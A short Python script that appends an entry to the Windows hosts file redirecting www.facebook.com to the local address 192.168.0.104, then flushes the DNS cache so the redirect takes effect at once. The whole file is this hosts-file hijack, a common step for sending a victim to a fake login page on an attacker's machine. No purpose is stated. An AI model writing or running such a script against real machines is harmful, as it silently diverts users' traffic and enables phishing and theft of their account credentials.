import subprocess
import os

os.chdir("C:\\Windows\\System32\\drivers\\etc") 


command = "echo 192.168.0.104 www.facebook.com >> hosts"  
                                                
CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

command = "ipconfig /flushdns"
CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)